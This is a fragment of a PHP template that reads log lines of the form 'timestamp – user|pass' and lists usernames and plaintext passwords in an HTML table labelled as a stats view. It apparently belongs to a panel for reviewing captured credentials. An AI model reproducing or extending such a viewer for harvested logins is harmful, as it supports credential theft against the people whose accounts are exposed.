<?php if ($showTable): /* Show stats view */ ?>
    <table>
        <thead><tr><th>Timestamp</th><th>Username</th><th>Password</th></tr></thead>
        <tbody>
            <?php foreach($lines as $line): ?>
                <?php
                    /* Parse each line: timestamp – user|pass */
                    list($ts,$cred) = explode(' – ',$line, 2);
                    list($user,$pass)=explode('|',$cred, 2);
                ?>
                <tr>
                    <td><?=htmlspecialchars($ts)?></td>
                    <td><?=htmlspecialchars($user)?></td>
                    <td><?=htmlspecialchars($pass)?></td>
                </tr>
            <?php endforeach; ?>
